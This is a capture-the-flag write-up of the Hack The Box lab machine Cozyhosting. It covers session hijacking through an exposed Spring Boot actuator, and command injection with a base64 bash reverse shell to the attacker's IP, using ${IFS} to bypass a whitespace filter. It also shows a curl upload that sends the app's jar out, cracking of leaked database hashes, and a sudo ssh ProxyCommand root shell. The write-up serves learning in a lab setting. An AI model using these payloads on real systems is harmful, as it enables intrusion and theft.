---
title:  "HTB Cozyhosting Writeup"
date:   2024-03-02 00:30:00 
categories: HTB Machine
tags: Springboot GTFO_bin command_injection
---

![Cozyhosting](/assets/img/Cozyhosting/1693492807901.jpg)

## Introduction

Cozyhosting was a fairly easy machine to solve if you did your enumeration right. It thought some of the basic directory enumeration tacticis as well as basic command injection techniques. Getting root was trivial but such a common mistake that still gets made in production environments as well.

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.10.11.230
```
**Nmap**
```
Nmap scan report for 10.10.11.230
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/29%OT=22%CT=1%CU=40234%PV=Y%DS=2%DC=T%G=Y%TM=658EB1
OS:C0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST1
OS:1NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE
OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:3CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   25.20 ms 10.10.14.1
2   27.43 ms 10.10.11.230

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 29 06:47:12 2023 -- 1 IP address (1 host up) scanned in 44.26 seconds
```

Looking at the nmap output we can see that only the web application port **80** is open here. So lets go check this one out. When I looked at the web page i saw that this was a an informative website about a hosting platform. The application included a login page but there were no default credentials.

![Cozyhosting](/assets/img/Cozyhosting/Cozyhosting_01.png)

When enumerating directories on the machine i noticed something special. The 404 error message was very specific and helped me discover that spring boot was being used. Whitelabel error is very specific to springboot.

![Whitelabel error](/assets/img/Cozyhosting/Cozyhosting_02.png)


So now that we know that springboot is being used we can refine our enumeration to go after specifically springboot related paths. Then we'd stumble upon the **actuator** page. This page if reachable could lead to severe information disclosure. In this case we saw that the **sessions** actuator was enabled among others.

![Actuators](/assets/img/Cozyhosting/Cozyhosting_03.png)

The sessions actuator is quite self explanatory, It shows all the sessions present on the machine. When we browse to this page we can see that the user kanderson has a session open.

![Sessions](/assets/img/Cozyhosting/Cozyhosting_04.png)

So when we replace our session token with kanderson's token we can gain access to the admin panel

![Injecting token](/assets/img/Cozyhosting/Cozyhosting_05.png)

![Admin access](/assets/img/Cozyhosting/Cozyhosting_06.png)

### Code execution

So now we have access to the applications admin panel i saw there was functionality that tries to connect to a host with the ssh command. when i tried to add **:** symbol followed by the command i'd get a very clear and verbose error this error made it very clear that code injection would be possible. The first part of the command was ignored and we got an error of only the second part.

![Verbose error](/assets/img/Cozyhosting/Cozyhosting_07.png)


So now we need to build up the command we want to run First i'll start with  creating a base64 encoded bash reverse shell

```
echo -n '/bin/bash -l > /dev/tcp/10.10.14.153/443 0<&1 2>&1' | base64

```

this command gave us the following B64 encoded string 
```
L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMTUzLzQ0MyAwPCYxIDI+JjE=
```

Then using this B64 string our payload will look like this:

```
echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMTUzLzQ0MyAwPCYxIDI+JjE= | base64 --decode | bash
```

Though when using this payload we'd get another issue. The username can't contain spaces

![No whitespaces](/assets/img/Cozyhosting/Cozyhosting_08.png)


So now we need to change our payload to not have any whitespaces.In bash we can use variables that don't have any value to replace a space. The **IFS** variable is a classic example. So if we were to change all our whitespaces with **${IFS}** it should still work 

```
test;echo${IFS}L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMTUzLzQ0MyAwPCYxIDI+JjE=${IFS}|${IFS}base64${IFS}--decode${IFS}|${IFS}bash; 
```
![Code execution](/assets/img/Cozyhosting/Cozyhosting_09.png)

A moment later we'd get a callback on our reverse shell handler giving us access to the system as the user **app**

![shell as app](/assets/img/Cozyhosting/Cozyhosting_10.png)

## Lateral movement

We got access to the machine as the app user however this account is stil very limited. Running privilege escalation scripts were not fruitful at all so i decided to exfiltrate applications jar file to see if there was nothing i could still abuse or maybe even hardcoded credentials. 

I started up a python upload server with the following command

```
python3 -m uploadserver 80
```

then using the following curl command you can upload jar file

```
curl -X POST http://10.10.14.153/upload -F files=@cloudhosting-0.0.1.jar
```

After extracting the jar file i opened it using jd-gui, this tool decompiles the jar file and gives us access to the source code. When browsing through the sourcecode we could find the password of the postgres connection  in  **BOOT-INF/classes/application.properties**

![Postgres password](/assets/img/Cozyhosting/Cozyhosting_11.png)


Next we logged in to the postgres database using the credentials we just found.

```
psql -h localhost -d cozyhosting -U postgres
Vg&nvzAQ7XxR
```

when we successfully logged in i first listed the tables. here we could see a user table and i listed all entrees from this table extracting the users hashes

```
\dt
SELECT * FROM users;
```

Place the following hashes in a file.

```
$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

Then try to crack these using hashcat. After a few moments we'd see that one of the hashes was cracked **manchesterunited**

![Passwords cracked](/assets/img/Cozyhosting/Cozyhosting_12.png)

To know what user this password might work on i listed all users present on the machine by checking the contents of the passwd file.
```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Here we could see that josh was the only real user present so it was a good idea to try this password with the josh user

```
ssh josh@cozyhosting.htb
```

## Privesc

When i landed on the box the first thing I checked was which commands josh was allowed to run as root. here we could see it was allowed to run SSH as root with all parameters.

![Sudo -L](/assets/img/Cozyhosting/Cozyhosting_13.png)

SSH is a commonly abused binary for privilege escalation For more information on what you can do with this check out [gtfobins](https://gtfobins.github.io/gtfobins/ssh/).

Using the following command we were able to spawn an interactive root shell

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![shell as root](/assets/img/Cozyhosting/Cozyhosting_14.png)
